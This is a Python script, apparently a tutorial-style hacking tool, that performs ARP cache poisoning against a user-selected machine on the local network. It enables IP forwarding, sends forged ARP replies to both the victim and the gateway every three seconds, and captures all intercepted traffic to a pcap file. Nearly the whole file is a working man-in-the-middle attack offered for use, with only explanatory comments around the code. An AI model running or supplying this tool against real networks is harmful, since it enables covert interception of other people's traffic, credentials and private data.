#!/usr/bin python3
import scapy.all as scapy
import subprocess
import time
import sys
import os
from ipaddress import IPv4Network, ip_address
import socket
import threading


# We want the current working directory.
cwd = os.getcwd()

def in_sudo_mode():
    """If the user doesn't run the program with super user privileges, don't allow them to continue."""
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

def get_current_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        current_ip = s.getsockname()[0]
    except:
        current_ip = '127.0.0.1'
    print("Current IP is: " + current_ip)

def get_ip_range():
    while True:
        get_current_ip()
        input_range = input("Enter IP range (Ex: x.x.x.0/24): ")
        try:
            print(f"{IPv4Network(input_range)}")
            return input_range
        except:
            print("Invalid IP range please try again")
    

def enable_ip_forwarding():
    # You would normally run the command sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run this with subprocess.run()
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    # Load  in sysctl settings from the /etc/sysctl.conf file. 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

def disable_ip_forwarding():
    # You would normally run the command sysctl -w net.ipv4.ip_forward=1 to enable ip forwarding. We run this with subprocess.run()
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"])
    # Load  in sysctl settings from the /etc/sysctl.conf file. 
    subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])

def is_gateway(gateway_ip):
    # We run the command route -n which returns information about the gateways.
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # Loop through every row in the route -n command.
    for row in result:
        # We look to see if the gateway_ip is in the row, if it is we return True. If False program continues flow and returns False.
        if gateway_ip in row:
            return True
    return False

def arp_scan(ip_range):
    # We create an empty list where we will store the pairs of ARP responses.
    arp_responses = list()
    # We send arp packets through the network, verbose is set to 0 so it won't show any output.
    # scapy's arping function returns two lists. We're interested in the answered results which is at the 0 index.
    answered_lst = scapy.arping(ip_range, verbose=0)[0]
    # We loop through all the responses and add them to a dictionary and append them to the list arp_responses.
    for res in answered_lst:
        # Every response will look something lke like -> {"ip" : "10.0.0.4", "mac" : "00:00:00:00:00:00"}
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    # We return the list of arp responses which contains dictionaries for every arp response.
    return arp_responses

def print_arp_res(arp_res):
    print("ID |\tIP              |\tMAC Address        |")
    print("___|\t________________|\t___________________|")
    for id, res in enumerate(arp_res):
        # We are formatting the to print the id (number in the list), the ip and lastly the mac address.
        print("{}\t{}\t\t{}".format(id,res['ip'], res['mac']))
        print("-"*50)
    while True:
        try:
            # We have to verify the choice. If the choice is valid then the function returns the choice.
            choice = int(input("Please select the ID of the computer whose ARP cache you want to poison (ctrl+z to exit): "))
            if arp_res[choice]:
                return choice
        except KeyboardInterrupt:
            exit(disable_ip_forwarding())
        except:
            print("Please enter a valid choice!")

def get_interface_names():
    # The interface names are directory names in the /sys/class/net folder. So we change the directory to go there.
    os.chdir("/sys/class/net")
    # We use the listdir() function from the os module. Since we know there won't be files and only directories with the interface names we can save the output as the interface names.
    interface_names = os.listdir()
    # We return the interface names which we will use to find out which one is the name of the gateway.
    return interface_names

def match_iface_name(row):
    # We get all the interface names by running the function defined above with the 
    interface_names = get_interface_names()
    # Check if the interface name is in the row. If it is then we return the iface name.
    for iface in interface_names:
        if iface in row:
            return iface

def get_gateway_info(network_info):
    # We run route -n and capture the output.
    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")
    # We declare an empty list for the gateways.
    gateways = []
    # We supplied the arp_scan() results (which is a list) as an argument to the network_info parameter.
    for iface in network_info:
        for row in result:
            # We want the gateway information to be saved to list called gateways. We know the ip of the gateway so we can compare and see in which row it appears.
            if iface["ip"] in row:
                iface_name = match_iface_name(row)
                # Once we found the gateway, we create a dictionary with all of its names.
                gateways.append({"iface" : iface_name, "ip" : iface["ip"], "mac" : iface["mac"]})
    return gateways

def get_clients(arp_res, gateway_res):
    # In the menu we only want to give you access to the clients whose arp tables you want to poison. The gateway needs to be removed.
    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            # All items which are not the gateway will be appended to the client_list.
            if gateway["ip"] != item["ip"]:
                client_list.append(item)
    # return the list with the clients which will be used for the menu.
    return client_list

def arp_spoofer(target_ip, target_mac, spoof_ip):
    # We want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is a "is-at" response packet.
    # We can fool the ARP cache by sending a fake packet saying that we're at the router's ip to the target machine, and sending a packet to the router that we are at the target machine's ip.
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # ARP is a layer 3 protocol. So we use scapy.send(). We choose it to be verbose so we don't see the output.
    scapy.send(pkt, verbose=False)

def send_spoof_packets():
    # We need to send spoof packets to the gateway and the target device.
    while True:
        # We send an arp packet to the gateway saying that we are the the target machine.
        arp_spoofer(get_gateway_info["ip"], get_gateway_info["mac"], node_to_spoof["ip"])
        # We send an arp packet to the target machine saying that we are gateway.
        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], get_gateway_info["ip"])
        # Tested time.sleep() with different values. 3s seems adequate.
        time.sleep(3)

def packet_sniffer(interface):
    # We use the sniff function to sniff the packets going through the gateway interface. We don't store them as it takes a lot of resources. The process_sniffed_pkt is a callback function that will run on each packet.
    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)

def process_sniffed_pkt(pkt):
    print("Writing to pcap file. Press ctrl + c to exit.")
    # We append every packet sniffed to the requests.pcap file which we can inspect with Wireshark.
    scapy.wrpcap("requests.pcap", pkt, append=True)

#Main Function Below
in_sudo_mode()

ip_range = get_ip_range()

enable_ip_forwarding()

arp_res = arp_scan(ip_range)

if len(arp_res) == 0:
    print("No connectino detected, exiting...")
    exit(disable_ip_forwarding())

gateways = get_gateway_info(arp_res)
get_gateway_info = gateways[0]
client_info = get_clients(arp_res, gateways)

if len(client_info) == 0:
    print("No clients detected. Exiting...")
    exit(disable_ip_forwarding())

choice = print_arp_res(client_info)

node_to_spoof = client_info[choice]

t1 = threading.Thread(target=send_spoof_packets, daemon=True)
t1.start()

os.chdir(cwd)

try:
    packet_sniffer(get_gateway_info["iface"])
except:
    disable_ip_forwarding()
